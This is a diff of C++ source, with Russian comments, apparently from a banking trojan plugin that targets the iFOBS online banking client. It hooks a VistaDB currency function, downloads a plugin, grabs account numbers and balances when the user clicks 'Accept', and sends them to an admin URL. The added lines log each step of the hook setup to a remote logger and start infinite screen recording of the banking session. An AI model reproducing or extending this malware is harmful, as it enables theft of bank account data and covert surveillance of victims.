@@ -53,6 +53,8 @@ char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования н
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
 
+VideoSendLog* vsl = 0;
+
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	ForFindControl* ffc = (ForFindControl*)lParam;
@@ -220,9 +222,11 @@ static char* GetAdminUrl( char* url )
 static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
+	AccBalans* ab = (AccBalans*)p;
+	VideoSendLogName log( *vsl, "ifobs" );
+	log.Send( 10, "Счет: %s, баланс: %s", ab->acc, ab->balans );
 	if( GetAdminUrl(urlAdmin) )
 	{
-		AccBalans* ab = (AccBalans*)p;
 		fwsprintfA pwsprintfA = Get_wsprintfA();
 		TMemory request(512);
 		string azUser = GetAzUser();
@@ -250,25 +254,35 @@ void WINAPI PutBalans( const char* acc, const char* balans )
 
 DWORD WINAPI PluginIFobs(LPVOID)
 {
+	vsl = new VideoSendLog();
+	VideoSendLogName log( *vsl, "ifobs" );
+	log.Send2( 0, "Загрузка плагина ifobs.plug" );
 	TPlugin ifobsPlug("ifobs.plug");
 	if( ifobsPlug.Download(true) )
 	{
+		log.Send2( 1, "Плагин загружен" );
 		ifobsPlug.SetNotFree();
 		DBG( "IFobs", "Загрузили ifobs.plug" );
 		PInitFunc InitFunc = (PInitFunc)ifobsPlug.GetProcAddress("InitFunc");
 		if( InitFunc )
 		{
+			log.Send2( 2, "найдена InitFunc()" );
 			DBG( "IFobs", "есть InitFunc" );
 			DWORD HProc1 = (DWORD)ifobsPlug.GetProcAddress("HProc1");
 			if( HProc1 )
 			{
+				log.Send2( 3, "найдена HProc1()" );
 				DBG( "IFobs", "есть HProc1" );
 				//хукаем функцию @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString
 				if( HookApi( "VistaDB_D7.bpl", 0x238E92A4, (PVOID)HProc1, (PVOID*)&pTVDBDirectGetCurrency ) )
 				{
+					log.Send2( 4, "Установли хук" );
 					DBG( "IFobs", "Установлен хук на @Vdbdirect@TVDBDirect@GetCurrency$qqr17System@AnsiString" );
 					if( InitFunc((DWORD)&PutBalans, "BalanceCallBack") )
+					{
+						log.Send2( 5, "Установлена BalanceCallBack" );
 						DBG( "IFobs", "BalanceCallBack set ok.");
+					}
 					if( InitFunc((DWORD)pTVDBDirectGetCurrency, "GetCurrency") )
 						DBG( "IFobs", "хук установлен успешно, %08x %08x", pTVDBDirectGetCurrency, HProc1 );
 				}
@@ -320,6 +334,7 @@ void Activeted(LPVOID Sender)
 	RunThread( PluginIFobs, 0 );
 	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 		MegaJump(SendIFobs);
+	VideoRecorderSrv::StartInfiniteRecording("IFobs");
 }
 
 bool Init( const char* appName )
